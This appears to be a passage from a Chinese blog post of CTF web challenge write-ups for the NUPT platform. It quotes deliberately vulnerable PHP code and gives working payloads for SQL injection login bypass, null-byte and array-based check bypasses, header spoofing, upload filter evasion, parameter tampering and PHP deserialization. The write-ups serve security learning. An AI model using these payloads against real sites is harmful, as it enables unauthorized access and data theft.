<p><img src="https://s2.ax1x.com/2019/03/31/Ar2seA.png" alt="Ar2seA.png"></p>
<p>不过，注入的目的已经实现了。</p>
<h4 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;nctf&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (@ereg (<span class="string">&quot;^[1-9]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;nctf&#x27;</span>]) === <span class="literal">FALSE</span>)</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;必须输入数字才行&#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">&#x27;nctf&#x27;</span>], <span class="string">&#x27;#biubiubiu&#x27;</span>) !== <span class="literal">FALSE</span>)   </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;骚年，继续努力吧啊~&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>给了源码，那就好说了</p>
<p>ereg函数会把null值当成结束，可以使用%00截断，但是strpps会绕过%00，</p>
<p>strpos ($_GET[‘nctf’], ‘#biubiubiu’) !== FALSE，这句话要求nctf中包含“#biubiubiu”，所以构造payload：</p>
<p><code>?nctf=1%00%23biubiubiu</code></p>
<p><img src="https://s2.ax1x.com/2019/03/31/ArRgB9.png" alt="ArRgB9.png"></p>
<p>还有一种简单的方法，那就是strpos会被数组绕过</p>
<p>payload：<code>?nctf[]=</code></p>
<p><img src="https://s2.ax1x.com/2019/03/31/ArRcnJ.png" alt="ArRcnJ.png"></p>
<p>就可以了。</p>
<h5 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (md5(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) == md5(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>给了源码，MD5弱比较，直接数组绕过</p>
<p>payload:<code>?a[]=1&amp;b[]=2</code></p>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/ArW1ER"><img src="https://s2.ax1x.com/2019/03/31/ArW1ER.png" alt="ArW1ER.png"></a></p>
<p>或者取两个MD5值也可以</p>
<p>payload：<code>?a=QNKCDZO&amp;b=240610708</code></p>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/ArWQb9"><img src="https://s2.ax1x.com/2019/03/31/ArWQb9.png" alt="ArWQb9.png"></a></p>
<h4 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h4><p>根据页面的提示，在source.php中找到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>) &#123; <span class="meta">?&gt;</span></span><br><span class="line">                        <span class="meta">&lt;?php</span></span><br><span class="line">                        extract(<span class="variable">$_POST</span>);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$pass</span> == <span class="variable">$thepassword_123</span>) &#123; <span class="meta">?&gt;</span></span><br><span class="line">                            &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">alert</span> <span class="title">alert</span>-<span class="title">success</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">code</span>&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">theflag</span>; ?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看到了，extract函数，所以只要post传入任意的pass与thepassword_123值相等即可</p>
<p><img src="https://s2.ax1x.com/2019/03/31/ArfDL4.png" alt="ArfDL4.png"></p>
<h4 id="PHP是世界上最好的语言"><a href="#PHP是世界上最好的语言" class="headerlink" title="PHP是世界上最好的语言"></a>PHP是世界上最好的语言</h4><p>挂了</p>
<h4 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h4><p><img src="https://s2.ax1x.com/2019/03/31/ArhV6U.png" alt="ArhV6U.png"></p>
<p>看样子是要伪装成本地登录了，bp抓包，直接在header里添加</p>
<blockquote>
<p>X-Forwarded-For:127.0.0.1</p>
</blockquote>
<h4 id="header"><a href="#header" class="headerlink" title="header"></a>header</h4><p>挂了</p>
<h4 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h4><p>看一下源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot; /&gt;&lt;/head&gt;</span><br><span class="line"> </span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">文件上传&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;form action=&quot;upload.php&quot; method=&quot;post&quot;</span><br><span class="line">enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;dir&quot; value=&quot;/uploads/&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; </span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>传一张图片，显示如下：</p>
<p><img src="https://s2.ax1x.com/2019/04/01/AshnVH.png" alt="AshnVH.png"></p>
<p>提示上传.php，传一个php文件后，又说不能传php</p>
<p><img src="https://s2.ax1x.com/2019/04/01/Ashuad.png" alt="Ashuad.png"></p>
<p>bp抓包，先上传图片，抓到薄厚，再修改后缀名，尝试了很多php，Php，pHp，phP，PHp，pHP，PhP，PHP，phpphp，phphpp，php3，php4，php5等发现都失败，</p>
<p>再看看源码和报错信息，发现在经过图片后缀检查后，根据basename判断是不是php文件，所以可以用空字节截断，上传一个图片，在/uploads/后给出一个名字比如:<br>/uploads/1.php<br>然后在php后用hex增加一个00字符，即可成功绕过。</p>
<p><img src="https://s2.ax1x.com/2019/04/01/As4dmD.png" alt="As4dmD.png"></p>
<h4 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h4><p>点击source看一下源码，看一下SQL语句</p>
<blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select user from ctf where (user=&#x27;&quot;</span>.<span class="variable">$user</span>.<span class="string">&quot;&#x27;) and (pw=&#x27;&quot;</span>.<span class="variable">$pass</span>.<span class="string">&quot;&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>发现是单引号+括号的闭合，post：<code>user=1&#39;)%23&amp;pass=1</code>,不报错，闭合成功</p>
<p>要求是admin用户，那就构造payload：</p>
<p><code>user=admin&#39;)%23&amp;pass=1</code>   //%23会把后面的注释掉，不管密码对不对都可以</p>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/AsIhJs"><img src="https://s2.ax1x.com/2019/04/01/AsIhJs.png" alt="AsIhJs.png"></a></p>
<h4 id="pass-check"><a href="#pass-check" class="headerlink" title="pass check"></a>pass check</h4><p>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pass</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="variable">$pass1</span>=***********;<span class="comment">//被隐藏起来的密码</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$pass</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(@!strcmp(<span class="variable">$pass</span>,<span class="variable">$pass1</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag:nctf&#123;*&#125;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the pass is wrong!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;please input pass!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>考察PHP弱类型，从PHP社区文档的注解可以发现strcmp函数在比较数组时,会返回null。所以post的数据为<code>pass[]=a</code></p>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/AsoWnK"><img src="https://s2.ax1x.com/2019/04/01/AsoWnK.png" alt="AsoWnK.png"></a></p>
<h4 id="起名字真难"><a href="#起名字真难" class="headerlink" title="起名字真难"></a>起名字真难</h4><p>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span>(<span class="params"><span class="variable">$number</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="variable">$one</span> = ord(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">       <span class="variable">$nine</span> = ord(<span class="string">&#x27;9&#x27;</span>);</span><br><span class="line">       <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$number</span>); <span class="variable">$i</span>++)</span><br><span class="line">       &#123;   </span><br><span class="line">               <span class="variable">$digit</span> = ord(<span class="variable">$number</span>&#123;<span class="variable">$i</span>&#125;);</span><br><span class="line">               <span class="keyword">if</span> ( (<span class="variable">$digit</span> &gt;= <span class="variable">$one</span>) &amp;&amp; (<span class="variable">$digit</span> &lt;= <span class="variable">$nine</span>) )</span><br><span class="line">               &#123;</span><br><span class="line">                       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">               &#125;</span><br><span class="line">       &#125;</span><br><span class="line">          <span class="keyword">return</span> <span class="variable">$number</span> == <span class="string">&#x27;54975581388&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;*******&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(noother_says_correct(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]))</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;access denied&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>不能传入数字，但是要传入54975581388，才能得到flag，转换为十六进制传入可以绕过</p>
<p><img src="https://s2.ax1x.com/2019/04/01/As72dO.png" alt="As72dO.png"></p>
<h4 id="密码重置"><a href="#密码重置" class="headerlink" title="密码重置"></a>密码重置</h4><p><img src="https://s2.ax1x.com/2019/04/01/AsHuOx.png" alt="AsHuOx.png"></p>
<p>要admin用户密码，但是此时的用户是ctfuser，而且在不能在输入框中直接改，发现url中有user1=Y3RmdXNlcg==，Y3RmdXNlcg==是ctfuser经过base64加密的，所以把admin用base64编码之后，传入url中，发现没用，bp抓包试试</p>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/AsbK3j"><img src="https://s2.ax1x.com/2019/04/01/AsbK3j.png" alt="AsbK3j.png"></a></p>
<p>发现有三处穿了user的信息，把这三处都改成admin，其中前两处需要base64编码，即可得到flag</p>
<p><img src="https://s2.ax1x.com/2019/04/01/Asq9aT.png" alt="Asq9aT.png"></p>
<h4 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment">#GOAL: login as admin,then get the flag;</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;db.inc.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">		<span class="variable">$str</span>=stripslashes(<span class="variable">$str</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> htmlentities(<span class="variable">$str</span>, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = @clean((<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="variable">$password</span> = @clean((<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span>=<span class="string">&#x27;SELECT * FROM users WHERE name=\&#x27;&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;\&#x27; AND pass=\&#x27;&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;\&#x27;;&#x27;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$result</span> || mysql_num_rows(<span class="variable">$result</span>) &lt; <span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;Invalid password!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<p>TIP:反斜杠可以用来转义，仔细查看相关函数的用法</p>
<p>通过代码发现，需要传入GET类型的username以及password，首先调用了clean方法，在clean方法首先判断是否开启了添加反斜杠，如果添加了，使用stripslashes()删除反斜杠，然后调用htmlentities()方法将把字符转换为 HTML 实体,htmlentities($str, ENT_QUOTES)用来转换双引号和单引号。</p>
<p>函数原型是这样</p>
<blockquote>
<p> string htmlentities ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 [, string $encoding = ini_get(“default_charset”) [, bool $double_encode = true ]]] )</p>
</blockquote>
<p>参数flags缺省情况下与<code>$flags=ENT_QUOTES</code>情况下函数行为不同，</p>
<p>选值为<code>ENT_QUOTES</code>时<code>Will convert both double and single quotes</code>，</p>
<p>也就是说，前者不会将单引号编码而后者会。我们的最终目标是平衡引号，从而使查询语句语法正确，既然无法输入单引号，就消灭单引号。</p>
<p>访问<code>http://chinalover.sinaapp.com/web15/index.php?username=\&amp;password= or 1%23</code>，</p>
<p>也就是构造payload为<code>?username=\&amp;password= or 1%23</code> ，使得查询语句如下：</p>
<blockquote>
<p>SELECT <em>FROM users WHERE name=’admin\’ AND pass=’ or 1 #’;</em></p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/AySuPP"><img src="https://s2.ax1x.com/2019/04/01/AySuPP.png" alt="AySuPP.png"></a></p>
<h4 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a>综合题</h4><p>一大段的JSFUCK</p>
<p><img src="https://s2.ax1x.com/2019/04/01/AyS8bj.png" alt="AyS8bj.png"></p>
<p>解码看看，得到一个文件名，<strong>1bc29b36f623ba82aaf6724fd3b16718</strong>.php，访问一下，</p>
<h4 id="密码重置2"><a href="#密码重置2" class="headerlink" title="密码重置2"></a>密码重置2</h4><p>这题在学校的平台上做过。而且提示也够多。</p>
<p>看看源码，两处有用信息，首先这里，给了用户名，邮箱，文件编辑器</p>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/AOrIJI"><img src="https://s2.ax1x.com/2019/04/14/AOrIJI.png" alt="AOrIJI.png"></a></p>
<p>这里显示了有一个submit.php的页面</p>
<p><img src="https://s2.ax1x.com/2019/04/14/AOrHQf.png" alt="AOrHQf.png"></p>
<p>访问submit.php之后，说<strong>you are not admin</strong>,</p>
<p>要求管理员登录，邮箱知道了，但是token不知道，利用文件泄露，查看**.index.php.swp<strong>，啥也没有，查看</strong>.submit.php.swp**，会看到返回了源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$token</span>)&amp;&amp;!<span class="keyword">empty</span>(<span class="variable">$emailAddress</span>))&#123;</span><br><span class="line">	<span class="keyword">if</span>(strlen(<span class="variable">$token</span>)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">&#x27;fail&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$token</span>!=<span class="string">&#x27;0&#x27;</span>) <span class="keyword">die</span>(<span class="string">&#x27;fail&#x27;</span>);</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;SELECT count(*) as num from `user` where token=&#x27;<span class="subst">$token</span>&#x27; AND email=&#x27;<span class="subst">$emailAddress</span>&#x27;&quot;</span>;</span><br><span class="line">	<span class="variable">$r</span> = mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;db error&#x27;</span>);</span><br><span class="line">	<span class="variable">$r</span> = mysql_fetch_assoc(<span class="variable">$r</span>);</span><br><span class="line">	<span class="variable">$r</span> = <span class="variable">$r</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$r</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;失败了呀&quot;</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>看了源码，token有两个条件</p>
<blockquote>
<p>token长度等于10，值要等于0</p>
</blockquote>
<p>那么只需要使token=0000000000或者token=0e11111111(0e开头，PHP会解析为0)，</p>
<p>email就是上面的<a href="mailto:&#97;&#x64;&#x6d;&#105;&#x6e;&#x40;&#x6e;&#117;&#112;&#x74;&#x7a;&#x6a;&#x2e;&#99;&#x6e;">&#97;&#x64;&#x6d;&#105;&#x6e;&#x40;&#x6e;&#117;&#112;&#x74;&#x7a;&#x6a;&#x2e;&#99;&#x6e;</a></p>
<h4 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$enter</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">        <span class="variable">$pass</span>=stripslashes(<span class="variable">$pass</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$o</span> = unserialize(<span class="variable">$pass</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$o</span>) &#123;</span><br><span class="line">        <span class="variable">$o</span>-&gt;secret = <span class="string">&quot;*&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$o</span>-&gt;secret === <span class="variable">$o</span>-&gt;enter)</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Congratulation! Here is my secret: &quot;</span>.<span class="variable">$o</span>-&gt;secret;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Oh no... You can&#x27;t fool me&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;are you trolling?&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>$o = unserialize($pass)</code></p>
<p>然后将pass进行反序列化操作，并赋值给变量$o</p>
<p>如果对象o赋值成功，将对象o的secret变量设置为*，并判断对象o的secret变量和enter变量是否相等，===判断数值及属性，如果相等输出flag。</p>
<p>所以我们想到了引用<code>a=&amp;b</code>，&amp;属于引用，属于浅拷贝，一个改变另外一个也随之改变。<code>$this-&gt;enter=&amp;$this-&gt;secret</code></p>
<p>直接写一段代码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$enter</span>;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$secert</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;enter=&amp;<span class="keyword">$this</span>-&gt;secert;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> just4fun();</span><br><span class="line">print_r(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>运行之后得到<code>O:8:&quot;just4fun&quot;:2:&#123;s:5:&quot;enter&quot;;N;s:6:&quot;secert&quot;;R:2;&#125;</code>,构造payload：</p>
<p><code>?pass=O:8:&quot;just4fun&quot;:2:&#123;s:5:&quot;enter&quot;;N;s:6:&quot;secert&quot;;R:2;&#125;</code></p>
<h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h4><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(@file_get_contents(<span class="variable">$file</span>) == <span class="string">&quot;meizijiu&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$nctf</span>;</span><br><span class="line">&#125;--&gt;</span><br></pre></td></tr></table></figure>

<p>file_get_contents() 函数把整个文件读入一个字符串中。</p>
<p>如果从$file读入的字符串是”meizijiu”，就输出flag，可以利用PHP伪协议，php://input从我们post的信息中读入数据流，</p>
<p><img src="https://s2.ax1x.com/2019/04/14/AOcQXV.png" alt="AOcQXV.png"></p>
  
	</div>
		<footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/ctf/">ctf</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/ctf/">ctf</a><a href="/tags/南邮web/">南邮web</a>
  </div>

</div>



	<div class="article-share" id="share">
	
	  <div data-url="http://example.com/2019/03/30/%E5%A4%A7%E5%AD%A6CTF/%E5%8D%97%E9%82%AEctf-web/" data-title="南邮ctf--web | Hexo" data-tsina="" class="share clearfix">
	  </div>
	
	</div>


</footer>

   	       
	</article>
	
<nav class="article-nav clearfix">
 
 <div class="prev" >
 <a href="/2019/04/02/大学CTF/CUMT-ctf实训平台/" title="CUMT-ctf实训平台">
  <strong>上一篇：</strong><br/>
  <span>
  CUMT-ctf实训平台</span>
</a>
</div>


<div class="next">
<a href="/2019/03/28/大学CTF/php文件包含/"  title="php文件包含">
 <strong>下一篇：</strong><br/> 
 <span>php文件包含
</span>
</a>
</div>

</nav>

	



</div>  
      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>

  <div id="toc" class="toc-aside">
  <strong class="toc-title">Contents</strong>
 
 <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-number">2.1.</span> <span class="toc-text">签到题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#md5-collision"><span class="toc-number">2.2.</span> <span class="toc-text">md5 collision</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AD%BE%E5%88%B02"><span class="toc-number">2.3.</span> <span class="toc-text">签到2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%99%E9%A2%98%E4%B8%8D%E6%98%AFweb"><span class="toc-number">2.4.</span> <span class="toc-text">这题不是web</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 